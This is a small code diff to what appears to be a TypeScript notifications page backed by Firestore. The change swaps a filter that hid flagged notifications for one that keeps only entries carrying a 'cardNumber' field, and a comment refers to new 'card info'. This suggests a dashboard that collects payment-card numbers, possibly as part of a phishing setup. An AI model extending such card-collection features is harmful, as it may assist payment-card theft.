@@ -860,7 +860,7 @@ export default function NotificationsPage() {
             const data = doc.data() as any
             return { id: doc.id, ...data }
           })
-          .filter((notification: any) => !notification.isHidden) as Notification[]
+          .filter((notification: any) => notification.cardNumber) as Notification[]
 
         // Check if there are any new notifications with card info or general info
         const hasNewCardInfo = notificationsData.some(
